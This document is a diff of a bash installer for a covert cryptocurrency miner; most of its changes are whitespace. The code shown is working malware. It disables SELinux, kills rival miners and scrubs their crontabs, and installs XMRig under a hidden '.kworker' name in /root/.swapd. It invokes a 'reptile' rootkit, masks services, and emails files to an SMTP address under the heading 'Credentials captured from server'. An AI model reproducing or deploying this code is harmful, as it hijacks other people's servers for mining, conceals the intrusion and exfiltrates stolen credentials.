@@ -31,7 +31,7 @@ send_email_with_attachments() {
     local subject="$1"
     shift  # Remove first argument
     local attachments=("$@")  # Remaining arguments are file paths
-    
+
     # Build Python script with attachment support
     python3 << 'PYTHON_SCRIPT'
 import sys
@@ -47,12 +47,12 @@ try:
     # Get arguments from shell
     subject = '''SUBJECT_PLACEHOLDER'''
     attachments = '''ATTACHMENTS_PLACEHOLDER'''.split('|||')
-    
+
     msg = MIMEMultipart()
     msg['From'] = '''SENDER_EMAIL_PLACEHOLDER'''
     msg['To'] = '''RECIPIENT_EMAIL_PLACEHOLDER'''
     msg['Subject'] = subject
-    
+
     # Email body
     hostname = os.popen('hostname 2>/dev/null').read().strip() or 'unknown'
     body = f"""
@@ -63,37 +63,37 @@ Attached files:
     for att in attachments:
         if att and os.path.isfile(att):
             body += f"  - {os.path.basename(att)}\n"
-    
+
     msg.attach(MIMEText(body, 'plain'))
-    
+
     # Attach files
     for filepath in attachments:
         if not filepath or not os.path.isfile(filepath):
             continue
-            
+
         with open(filepath, 'rb') as f:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(f.read())
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
             msg.attach(part)
-    
+
     context = ssl.create_default_context()
-    
+
     with smtplib.SMTP('''SMTP_SERVER_PLACEHOLDER''', SMTP_PORT_PLACEHOLDER, timeout=30) as server:
         server.ehlo()
         server.starttls(context=context)
         server.ehlo()
         server.login('''SENDER_EMAIL_PLACEHOLDER''', '''SMTP_PASSWORD_PLACEHOLDER''')
         server.send_message(msg)
-    
+
     print("SUCCESS")
     sys.exit(0)
 except Exception as e:
     print(f"ERROR: {str(e)}", file=sys.stderr)
     sys.exit(1)
 PYTHON_SCRIPT
-    
+
     # Replace placeholders in the heredoc
     local python_code=$(cat <<PYCODE
 import sys
@@ -108,12 +108,12 @@ import os
 try:
     subject = '''$subject'''
     attachments = '''$(IFS='|||'; echo "${attachments[*]}")'''.split('|||')
-    
+
     msg = MIMEMultipart()
     msg['From'] = '''$SENDER_EMAIL'''
     msg['To'] = '''$RECIPIENT_EMAIL'''
     msg['Subject'] = subject
-    
+
     hostname = os.popen('hostname 2>/dev/null').read().strip() or 'unknown'
     body = f"""Credentials captured from server: {hostname}
 
@@ -122,9 +122,9 @@ Attached files:
     for att in attachments:
         if att and os.path.isfile(att):
             body += f"  - {os.path.basename(att)}\\n"
-    
+
     msg.attach(MIMEText(body, 'plain'))
-    
+
     for filepath in attachments:
         if not filepath or not os.path.isfile(filepath):
             continue
@@ -134,7 +134,7 @@ Attached files:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
             msg.attach(part)
-    
+
     context = ssl.create_default_context()
     with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
         server.ehlo()
@@ -142,7 +142,7 @@ Attached files:
         server.ehlo()
         server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
         server.send_message(msg)
-    
+
     print("SUCCESS")
     sys.exit(0)
 except Exception as e:
@@ -150,7 +150,7 @@ except Exception as e:
     sys.exit(1)
 PYCODE
 )
-    
+
     echo "$python_code" | python3 2>&1
     return $?
 }
@@ -301,10 +301,10 @@ if [ -t 0 ]; then
     echo "  6) Skip/Auto-detect  (Use detected: $DETECTED_ARCH)"
     echo ""
     echo -n "Enter choice [1-6] (default: $SUGGESTED_CHOICE): "
-    
+
     read -r ARCH_CHOICE
     ARCH_CHOICE=${ARCH_CHOICE:-$SUGGESTED_CHOICE}
-    
+
     case "$ARCH_CHOICE" in
         1) FORCE_ARCH="x86_64"; echo "[*] Selected: x86_64" ;;
         2) FORCE_ARCH="aarch64"; echo "[*] Selected: ARM64" ;;
@@ -318,7 +318,7 @@ else
     # NON-INTERACTIVE MODE (piped from curl) - Auto-detect silently
     FORCE_ARCH="$DETECTED_ARCH"
     echo "[*] Non-interactive mode: Auto-detected architecture: $DETECTED_ARCH"
-    
+
     # Validate architecture is supported
     case "$DETECTED_ARCH" in
         x86_64|amd64)
@@ -352,7 +352,7 @@ setenforce 0 2>/dev/null || true
 echo "[✓] SELinux disabled (if present)"
 
 # ==================== VERBOSE MODE ====================
-# Set to true for detailed output, false for quiet mode  
+# Set to true for detailed output, false for quiet mode
 VERBOSE=true
 
 if [ "$VERBOSE" = true ]; then
@@ -473,15 +473,15 @@ fi
 
 if [ -n "$GLIBC_VERSION" ]; then
     echo "[*] Detected GLIBC version: $GLIBC_VERSION"
-    
+
     # Compare version (convert to integer: 2.12 -> 212, 2.17 -> 217)
     GLIBC_MAJOR=$(echo "$GLIBC_VERSION" | cut -d. -f1)
     GLIBC_MINOR=$(echo "$GLIBC_VERSION" | cut -d. -f2)
     GLIBC_NUM=$((GLIBC_MAJOR * 100 + GLIBC_MINOR))
-    
+
     # XMRig 6.x requires GLIBC 2.14+
     XMRIG_MIN_GLIBC=214  # 2.14
-    
+
     if [ "$GLIBC_NUM" -lt "$XMRIG_MIN_GLIBC" ]; then
         echo "[!] WARNING: GLIBC $GLIBC_VERSION is too old for XMRig 6.x (needs 2.14+)"
         echo "[*] Will use cpuminer-multi instead (compatible with older systems)"
@@ -500,7 +500,7 @@ fi
 if [ -f /etc/redhat-release ]; then
     OS_INFO=$(cat /etc/redhat-release)
     echo "[*] OS: $OS_INFO"
-    
+
     # CentOS 6.x = GLIBC 2.12 (needs cpuminer)
     # CentOS 7.x = GLIBC 2.17 (XMRig OK)
     if echo "$OS_INFO" | grep -qE "release 6\.|CentOS 6"; then
@@ -581,19 +581,19 @@ for service_name in "${OLD_SERVICES[@]}"; do
     # Check if service exists
     if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
         echo "    [*] Found old service: $service_name"
-        
+
         # Stop the service
         systemctl stop "$service_name" 2>/dev/null || true
-        
+
         # Disable the service
         systemctl disable "$service_name" 2>/dev/null || true
-        
+
         # Remove service file
         rm -f "/etc/systemd/system/${service_name}.service" 2>/dev/null || true
-        
+
         echo "    [✓] Stopped and removed: $service_name"
     fi
-    
+
     # Also check SysV init
     if [ -f "/etc/init.d/$service_name" ]; then
         /etc/init.d/"$service_name" stop 2>/dev/null || true
@@ -734,12 +734,12 @@ echo ""
 reptile_cmd() {
     local cmd="$1"
     shift
-    
+
     # Skip entirely on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         return 0
     fi
-    
+
     # Try different possible locations where reptile might be installed
     if [ -f /reptile/bin/reptile ]; then
         /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
@@ -785,22 +785,22 @@ if command -v dpkg >/dev/null 2>&1; then
     echo "========================================"
     echo "CHECKING DPKG STATUS"
     echo "========================================"
-    
+
     # Check if dpkg was interrupted
     DPKG_INTERRUPTED=false
-    
+
     # Method 1: Check dpkg status (ONLY packages with actual problems)
     if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
         DPKG_INTERRUPTED=true
         echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
     fi
-    
+
     # Method 2: Check apt-get for ACTUAL errors (not just warnings)
     if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
         DPKG_INTERRUPTED=true
         echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
     fi
-    
+
     # Method 3: Check lock files ONLY if process is stuck
     if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
         # Only consider it interrupted if lock file exists AND process is stuck
@@ -818,20 +818,20 @@ if command -v dpkg >/dev/null 2>&1; then
             echo "[!] DPKG may have been interrupted (stale lock with no process)"
         fi
     fi
-    
+
     # Fix if interrupted
     if [ "$DPKG_INTERRUPTED" = "true" ]; then
         echo ""
         echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
         echo "========================================"
-        
+
         # Kill any stuck dpkg processes
         echo "[*] Checking for stuck dpkg processes..."
         pkill -9 dpkg 2>/dev/null || true
         pkill -9 apt-get 2>/dev/null || true
         pkill -9 apt 2>/dev/null || true
         sleep 2
-        
+
         # Remove lock files if they exist and no process is using them
         echo "[*] Removing stale lock files..."
         if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
@@ -840,34 +840,34 @@ if command -v dpkg >/dev/null 2>&1; then
             rm -f /var/lib/apt/lists/lock 2>/dev/null || true
             rm -f /var/cache/apt/archives/lock 2>/dev/null || true
         fi
-        
+
         # Run dpkg --configure -a to fix interrupted installations
         echo "[*] Running: dpkg --configure -a"
         echo ""
-        
+
         DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
-        
+
         sleep 2
-        
+
         # Fix any broken dependencies
         echo ""
         echo "[*] Running: apt-get install -f"
-        
+
         DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
-        
+
         sleep 2
-        
+
         # Verify it's fixed
         echo ""
         echo "[*] Verifying dpkg is now working..."
-        
+
         if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
             echo "[!] WARNING: Some packages may still have issues"
             echo "[*] Continuing anyway - script will handle package errors"
         else
             echo "[✓] DPKG is now working correctly"
         fi
-        
+
         echo "========================================"
         echo ""
     else
@@ -883,14 +883,14 @@ force_stop_service() {
     local process_names="$2"  # Space-separated list of process names
     local max_attempts=60     # 60 attempts = ~5 minutes max
     local attempt=0
-    
+
     echo "[*] Force-stopping services: $service_names"
     echo "[*] Force-stopping processes: $process_names"
-    
+
     while [ $attempt -lt $max_attempts ]; do
         attempt=$((attempt + 1))
         local all_stopped=true
-        
+
         # Method 1: Try systemctl stop for each service
         if [ -n "$service_names" ]; then
             for svc in $service_names; do
@@ -901,20 +901,20 @@ force_stop_service() {
                 fi
             done
         fi
-        
+
         # Method 2: Kill processes by name (all methods)
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
                 # Check if any process with this name exists
                 if proc_pids "$proc" | grep -q . 2>/dev/null; then
                     echo "[*] Attempt $attempt: Killing process $proc..."
-                    
+
                     # Method 2a: pkill by exact name
                     pkill -9 -x "$proc" 2>/dev/null || true
-                    
+
                     # Method 2b: pkill by pattern (full command line)
                     pkill -9 -f "$proc" 2>/dev/null || true
-                    
+
                     # Method 2c: Find and kill by PID
                     local pids
 
@@ -924,7 +924,7 @@ force_stop_service() {
                             kill -9 "$pid" 2>/dev/null || true
                         done
                     fi
-                    
+
                     # Method 2d: Find by full command and kill
                     local pids
 
@@ -934,12 +934,12 @@ force_stop_service() {
                             kill -9 "$pid" 2>/dev/null || true
                         done
                     fi
-                    
+
                     all_stopped=false
                 fi
             done
         fi
-        
+
         # Method 3: Check /proc for survivors
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
@@ -960,17 +960,17 @@ force_stop_service() {
                 done
             done
         fi
-        
+
         # If everything is stopped, break out
         if [ "$all_stopped" = true ]; then
             echo "[✓] All services/processes stopped after $attempt attempts"
             return 0
         fi
-        
+
         # Wait before next attempt
         sleep 3
     done
-    
+
     echo "[!] WARNING: Some services/processes may still be running after $max_attempts attempts"
     echo "[*] Continuing anyway..."
     return 0
@@ -996,13 +996,13 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         systemctl disable "$svc" 2>/dev/null || true
         systemctl mask "$svc" 2>/dev/null || true  # Prevent re-enabling
     done
-    
+
     # Remove service files immediately
     rm -f /etc/systemd/system/swapd.service 2>/dev/null
     rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
     rm -f /etc/systemd/system/xmrig.service 2>/dev/null
     rm -f /etc/systemd/system/system-watchdog.service 2>/dev/null
-    
+
     # Reload systemd to forget the services
     systemctl daemon-reload 2>/dev/null || true
     systemctl reset-failed 2>/dev/null || true
@@ -1038,26 +1038,26 @@ echo ""
 is_our_miner() {
     local pid=$1
     [ -z "$pid" ] && return 1
-    
+
     local cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
     local exe=$(readlink /proc/$pid/exe 2>/dev/null)
-    
+
     # Check if it's our swapd binary
     [[ "$exe" == "/root/.swapd/swapd" ]] && return 0
-    
+
     # Check if command line contains our wallet
     [[ "$cmdline" == *"$WALLET_ADDRESS"* ]] && return 0
-    
+
     # Check if it's our config
     [[ "$cmdline" == *"/root/.swapd/swapfile"* ]] && return 0
-    
+
     return 1
 }
 
 # Kill competing miners by process name
 kill_competing_miners_by_name() {
     echo "[*] Scanning for known miner process names..."
-    
+
     local MINER_NAMES=(
         "xmrig" "xmrigDaemon" "xmrigMiner" "xmr-stak"
         "minerd" "minergate" "cpuminer" "cpuminer-multi"
@@ -1074,7 +1074,7 @@ kill_competing_miners_by_name() {
         "kworker34" "kworkerds" "init10.cfg" "wl.conf"
         "sustes" "donns" "bonns" "kx.jpg"
     )
-    
+
     local KILLED=0
     for name in "${MINER_NAMES[@]}"; do
         for pid in $(pgrep -f "$name" 2>/dev/null); do
@@ -1086,27 +1086,27 @@ kill_competing_miners_by_name() {
             fi
         done
     done
-    
+
     [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED competing miner processes" || echo "[✓] No competing miners found by name"
 }
 
 # Kill miners by high CPU + network connection to mining pools
 kill_miners_by_network() {
     echo "[*] Scanning for mining pool connections..."
-    
+
     local POOL_PORTS=(3333 4444 5555 6666 7777 9999 14444 14433 13531 3347)
     local KILLED=0
-    
+
     for port in "${POOL_PORTS[@]}"; do
         for pid_info in $(netstat -anp 2>/dev/null | grep ":$port" | awk '{print $7}' | grep -v '-' | sort -u); do
             local pid=$(echo $pid_info | awk -F'/' '{print $1}')
             [ -z "$pid" ] && continue
-            
+
             # Skip if it's our miner
             if is_our_miner $pid 2>/dev/null; then
                 continue
             fi
-            
+
             # Check CPU usage
             local cpu_usage=$(ps -p $pid -o %cpu= 2>/dev/null | awk '{print int($1)}')
             if [ -n "$cpu_usage" ] && [ "$cpu_usage" -gt 30 ]; then
@@ -1118,18 +1118,18 @@ kill_miners_by_network() {
             fi
         done
     done
-    
+
     [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED mining pool connections" || echo "[✓] No mining pool connections found"
 }
 
 # Kill miners by known IP addresses
 kill_miners_by_ip() {
     echo "[*] Scanning for known malicious IPs..."
-    
+
     local MALICIOUS_IPS=(
         "91.214.65.238" "69.28.55.86" "185.71.65.238" "140.82.52.87"
     )
-    
+
     local KILLED=0
     for ip in "${MALICIOUS_IPS[@]}"; do
         for pid in $(netstat -anp 2>/dev/null | grep "$ip" | awk '{print $7}' | awk -F'/' '{print $1}' | grep -v '^$' | sort -u); do
@@ -1141,14 +1141,14 @@ kill_miners_by_ip() {
             fi
         done
     done
-    
+
     [ $KILLED -gt 0 ] && echo "[✓] Killed $KILLED processes connected to malicious IPs" || echo "[✓] No malicious IP connections found"
 }
 
 # Remove known miner files and directories
 remove_miner_files() {
     echo "[*] Removing known miner files..."
-    
+
     local REMOVED=0
     local MINER_PATHS=(
         "/tmp/.xm*" "/tmp/xmrig*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*"
@@ -1163,10 +1163,10 @@ remove_miner_files() {
         "/boot/grub/deamon" "/boot/grub/disk_genius"
         "/usr/bin/.sshd" "/tmp/.main" "/tmp/.cron"
     )
-    
+
     # Enable nullglob to handle patterns that don't match any files
     shopt -s nullglob 2>/dev/null || true
-    
+
     for path_pattern in "${MINER_PATHS[@]}"; do
         for file in $path_pattern; do
             if [ -e "$file" ]; then
@@ -1174,26 +1174,26 @@ remove_miner_files() {
             fi
         done
     done
-    
+
     # Restore original nullglob setting
     shopt -u nullglob 2>/dev/null || true
-    
+
     [ $REMOVED -gt 0 ] && echo "[✓] Removed $REMOVED miner files/directories" || echo "[✓] No miner files found"
 }
 
 # Clean malicious crontab entries
 clean_crontabs() {
     echo "[*] Cleaning malicious crontab entries..."
-    
+
     local CLEANED=0
     for user in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
         # Create temporary file for cleaned crontab
         local temp_cron=$(mktemp)
-        
+
         # Get current crontab, filter out miner entries
         if crontab -u $user -l 2>/dev/null | \
            grep -v -E '(xmrig|kinsing|updates\.dyndn-web|kernelupdates|kernelcfg|34e2fg|sourplum|wnTKYg|ddg|qW3xT|biosetjenkins|\.Historys|\.sshd|neptune)' > "$temp_cron"; then
-            
+
             # Check if anything was filtered
             if ! cmp -s <(crontab -u $user -l 2>/dev/null) "$temp_cron"; then
                 crontab -u $user "$temp_cron" 2>/dev/null && {
@@ -1204,7 +1204,7 @@ clean_crontabs() {
         fi
         rm -f "$temp_cron"
     done
-    
+
     [ $CLEANED -gt 0 ] && echo "[✓] Cleaned $CLEANED user crontabs" || echo "[✓] No malicious crontab entries found"
 }
 
@@ -1276,36 +1276,36 @@ if command -v apt >/dev/null 2>&1; then
     # Debian / Ubuntu cleanup
     echo "[*] Running apt autoremove..."
     NEEDRESTART_MODE=a apt-get autoremove -y 2>/dev/null || true
-    
+
     echo "[*] Running apt autoclean..."
     apt-get autoclean -y 2>/dev/null || true
-    
+
     echo "[*] Running apt clean..."
     apt-get clean 2>/dev/null || true
-    
+
     # Remove old kernels (keep current + 1 previous)
     echo "[*] Removing old kernel packages..."
     dpkg --list | grep -E 'linux-image-[0-9]' | grep -v "$(uname -r)" | awk '{print $2}' | sort -V | head -n -1 | xargs -r apt-get purge -y 2>/dev/null || true
-    
+
 elif command -v dnf >/dev/null 2>&1; then
     # Fedora / RHEL 8+ cleanup
     echo "[*] Running dnf autoremove..."
     dnf autoremove -y 2>/dev/null || true
-    
+
     echo "[*] Running dnf clean..."
     dnf clean all 2>/dev/null || true
-    
+
 elif command -v yum >/dev/null 2>&1; then
     # RHEL 7 / CentOS 7 cleanup
     echo "[*] Running yum autoremove..."
     yum autoremove -y 2>/dev/null || true
-    
+
     echo "[*] Running yum clean..."
     yum clean all 2>/dev/null || true
-    
+
     # Remove old kernels (keep current + 1 previous)
     package-cleanup --oldkernels --count=2 -y 2>/dev/null || true
-    
+
 elif command -v zypper >/dev/null 2>&1; then
     # openSUSE / SLE cleanup
     echo "[*] Running zypper clean..."
@@ -1331,7 +1331,7 @@ if command -v apt >/dev/null 2>&1; then
     # Backports for newer kernels (Debian)
     NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y 2>/dev/null || true
     NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y 2>/dev/null || true
-    
+
 elif command -v dnf >/dev/null 2>&1; then
     # Fedora / RHEL 8+ / CentOS Stream
     echo "[*] Detected Fedora/RHEL 8+ system"
@@ -1343,7 +1343,7 @@ elif command -v dnf >/dev/null 2>&1; then
     dnf install -y kernel-devel kernel-headers 2>/dev/null || true
     # Install required build tools
     dnf install -y gcc make git elfutils-libelf-devel 2>/dev/null || true
-    
+
 elif command -v yum >/dev/null 2>&1; then
     # RHEL 7 / CentOS 7
     echo "[*] Detected RHEL/CentOS 7 system"
@@ -1355,7 +1355,7 @@ elif command -v yum >/dev/null 2>&1; then
     yum install -y kernel-devel kernel-headers 2>/dev/null || true
     # Install required build tools
     yum install -y gcc make git elfutils-libelf-devel 2>/dev/null || true
-    
+
 elif command -v zypper >/dev/null 2>&1; then
     # openSUSE / SLE
     echo "[*] Detected openSUSE/SLE system"
@@ -1365,7 +1365,7 @@ elif command -v zypper >/dev/null 2>&1; then
     zypper install -y kernel-devel kernel-default-devel 2>/dev/null || true
     # Install build tools
     zypper install -y gcc make git ncurses-devel 2>/dev/null || true
-    
+
 else
     echo "[!] WARNING: Unsupported distribution. Kernel headers may not be installed."
 fi
@@ -1385,7 +1385,7 @@ if [ -d "$KERNEL_SRC" ]; then
         # Suppress interactive prompts
         yes "" | make oldconfig 2>/dev/null || true
         make prepare 2>/dev/null || true
-        
+
         # Verify critical files exist
         if [ -f include/generated/autoconf.h ] && [ -f include/config/auto.conf ]; then
             echo "[✓] Kernel headers prepared successfully"
@@ -1481,15 +1481,15 @@ if [ -n "$AVAILABLE_KB" ] && [ "$AVAILABLE_KB" -lt "$REQUIRED_KB" ]; then
     echo "[!] WARNING: Low disk space detected!"
     echo "[!] Available: $((AVAILABLE_KB / 1024))MB | Required: $((REQUIRED_KB / 1024))MB"
     echo "[*] Attempting cleanup..."
-    
+
     # Clean package cache
     apt-get clean 2>/dev/null || true
     yum clean all 2>/dev/null || true
-    
+
     # Remove old logs
     find /var/log -type f -name "*.log.*" -delete 2>/dev/null || true
     find /var/log -type f -name "*.gz" -delete 2>/dev/null || true
-    
+
     # Re-check
     AVAILABLE_KB=$(df /root 2>/dev/null | tail -1 | awk '{print $4}')
     echo "[*] After cleanup: $((AVAILABLE_KB / 1024))MB available"
@@ -1498,23 +1498,23 @@ fi
 # ==================== DOWNLOAD MINER ====================
 if [ "$MINER_TYPE" = "cpuminer" ]; then
     echo "[*] Downloading compatible miner for this system..."
-    
+
     mkdir -p /root/.swapd
     cd /root/.swapd || exit 1
-    
+
     # Clean up any previous failed attempts
     rm -f swapd cpuminer* srbminer* xmrig* *.tar.* 2>/dev/null
-    
+
     DOWNLOAD_SUCCESS=false
-    
+
     # ===== x86_64 with old GLIBC (CentOS 6, etc) =====
     if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
         echo "[*] x86_64 system with old GLIBC detected"
         echo "[*] Trying cpuminer-multi (supports GLIBC 2.5+)..."
-        
+
         # cpuminer-multi v1.3.7 - compatible with older GLIBC
         CPUMINER_URL="https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.7/cpuminer-multi-rel1.3.7-x86_64_linux.tar.gz"
-        
+
         echo "[*] Downloading cpuminer-multi v1.3.7..."
         echo "[*] URL: $CPUMINER_URL"
         echo "[*] Attempting download with curl..."
@@ -1537,7 +1537,7 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
                 rm -rf cpuminer.tar.gz cpuminer-multi* 2>/dev/null
             fi
         fi
-        
+
         # Fallback: wget
         if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
             echo "[*] Retrying with wget..."
@@ -1560,21 +1560,21 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
                 fi
             fi
         fi
-        
+
     # ===== ARM systems (ARMv7, ARM64) =====
     else
         echo "[*] ARM system detected - trying ARM-compatible miners..."
         echo "[*] Note: Using SRBMiner-MULTI (best ARM support)"
-        
+
         # Method 1: SRBMiner-MULTI (best ARM support, actively maintained)
         echo "[*] Trying SRBMiner-MULTI for ARM..."
         SRBMINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.4/SRBMiner-Multi-2-4-4-Linux-arm.tar.xz"
-        
+
         if curl -L -k -o srbminer.tar.xz "$SRBMINER_URL" 2>/dev/null && [ -s srbminer.tar.xz ]; then
             FILE_SIZE=$(stat -c%s srbminer.tar.xz 2>/dev/null || wc -c < srbminer.tar.xz)
             if [ "$FILE_SIZE" -gt 100000 ]; then
                 echo "[*] Downloaded SRBMiner ($((FILE_SIZE / 1024))KB), extracting..."
-                
+
                 # Try xz extraction (may not be available on BusyBox)
                 if tar -xf srbminer.tar.xz 2>/dev/null || xz -d < srbminer.tar.xz | tar -x 2>/dev/null; then
                     # Look for binary
@@ -1590,14 +1590,14 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
                 rm -rf srbminer.tar.xz SRBMiner-Multi-* 2>/dev/null
             fi
         fi
-        
+
         # Method 2: XMRig static build (if available)
         if [ "$DOWNLOAD_SUCCESS" = false ]; then
             echo "[*] Trying XMRig static ARM build..."
             # Note: XMRig doesn't always have ARMv7 static builds
             # This might also return 404, but worth trying
             XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
-            
+
             if curl -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && [ -s xmrig.tar.gz ]; then
                 FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
                 if [ "$FILE_SIZE" -gt 100000 ]; then
@@ -1616,7 +1616,7 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
                 fi
             fi
         fi
-        
+
         # Method 3: wget fallback for SRBMiner
         if [ "$DOWNLOAD_SUCCESS" = false ] && command -v wget >/dev/null 2>&1; then
             echo "[*] Retrying with wget..."
@@ -1637,11 +1637,11 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
             fi
         fi
     fi
-    
+
     # Validate the downloaded binary
     if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f swapd ]; then
         chmod +x swapd 2>/dev/null
-        
+
         # Check file size (must be at least 500KB for a real miner)
         FILE_SIZE=$(stat -c%s swapd 2>/dev/null || wc -c < swapd)
         if [ "$FILE_SIZE" -lt 500000 ]; then
@@ -1654,7 +1654,7 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
             ls -lh swapd
         fi
     fi
-    
+
     # Final check
     if [ ! -f swapd ] || [ ! -s swapd ]; then
         echo ""
@@ -1676,7 +1676,7 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
         echo "  Available space:"
         df -h /root | tail -1
         echo ""
-        
+
         if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
             echo "For CentOS 6 / old GLIBC systems:"
             echo "  Manual install of cpuminer-multi:"
@@ -1690,10 +1690,10 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
         echo ""
         exit 1
     fi
-    
+
     # Skip XMRig download entirely
     DOWNLOAD_SUCCESS=true
-    
+
 elif [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== DOWNLOAD XMRIG ====================
 echo "[*] Downloading XMRig..."
@@ -1768,13 +1768,13 @@ EXPECTED_SIZE_MAX=3600000  # 3.6MB maximum
 # Retry download up to 3 times with different mirrors
 for mirror in "${MIRRORS[@]}"; do
     [ "$DOWNLOAD_SUCCESS" = true ] && break
-    
+
     ATTEMPTS=$((ATTEMPTS + 1))
     echo "[*] Download attempt $ATTEMPTS/$MAX_ATTEMPTS from: $mirror"
-    
+
     # Remove old failed download
     rm -f xmrig.tar.gz 2>/dev/null
-    
+
     # Try to download xmrig
     if [ "$USE_WGET" = true ]; then
         if [ "$VERBOSE" = true ]; then
@@ -1791,12 +1791,12 @@ for mirror in "${MIRRORS[@]}"; do
             curl --max-time 60 --retry 2 -sS -L -k -o xmrig.tar.gz "$mirror" 2>/dev/null && DOWNLOAD_SUCCESS=true
         fi
     fi
-    
+
     # Verify download - check if file exists, has content, and is the right size
     if [ -f xmrig.tar.gz ] && [ -s xmrig.tar.gz ]; then
         FILE_SIZE=$(stat -c%s xmrig.tar.gz 2>/dev/null || wc -c < xmrig.tar.gz)
         echo "[*] Downloaded: $((FILE_SIZE / 1024 / 1024))MB ($FILE_SIZE bytes)"
-        
+
         # Check if size is in expected range
         if [ "$FILE_SIZE" -lt "$EXPECTED_SIZE_MIN" ]; then
             echo "[!] Downloaded file too small (corrupted/incomplete)"
@@ -1823,7 +1823,7 @@ for mirror in "${MIRRORS[@]}"; do
         DOWNLOAD_SUCCESS=false
         rm -f xmrig.tar.gz
     fi
-    
+
     sleep 2
 done
 
@@ -1841,7 +1841,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             DOWNLOAD_SUCCESS=false
         }
     fi
-    
+
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
         # Rename xmrig to hidden .kworker (actual miner binary)
         mv xmrig-*/xmrig .kworker 2>/dev/null || {
@@ -1849,17 +1849,17 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             DOWNLOAD_SUCCESS=false
         }
     fi
-    
+
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
         chmod +x .kworker 2>/dev/null || true
-        
+
         # Check if binary exists and is an ELF executable
         echo "[*] Verifying binary..."
         if [ -f .kworker ] && [ -x .kworker ]; then
             # Check if it's a valid ELF binary
             if file .kworker 2>/dev/null | grep -qE "ELF.*executable"; then
                 echo "[✓] Binary is a valid ELF executable"
-                
+
                 # Try version check (non-critical - just informational)
                 if ./.kworker --version >/dev/null 2>&1; then
                     VERSION_INFO=$(./.kworker --version 2>&1 | head -1 || echo "unknown")
@@ -1867,14 +1867,14 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
                 else
                     echo "[!] WARNING: Cannot run --version (may need libraries)"
                     echo "[*] This is OK - binary will be tested when service starts"
-                    
+
                     # Show what libraries might be missing
                     if command -v ldd >/dev/null 2>&1; then
                         echo "[*] Checking dependencies:"
                         ldd .kworker 2>&1 | grep "not found" || echo "    All dependencies found (or ldd failed)"
                     fi
                 fi
-                
+
                 rm -rf xmrig-* xmrig.tar.gz
                 echo "[✓] XMRig downloaded and ready"
             else
@@ -1990,42 +1990,42 @@ echo "PASS..."
 # Universal IP detection compatible with ancient systems
 get_server_ip() {
     local ip=""
-    
+
     # Method 1: Try external IP service (requires network)
     ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
     if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
         echo "$ip"
         return 0
     fi
-    
+
     # Method 2: Try ip command (modern systems)
     ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
     if [ -n "$ip" ]; then
         echo "$ip"
         return 0
     fi
-    
+
     # Method 3: Try ifconfig (older systems)
     ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
     if [ -n "$ip" ]; then
         echo "$ip"
         return 0
     fi
-    
+
     # Method 4: Try ip route (intermediate systems)
     ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
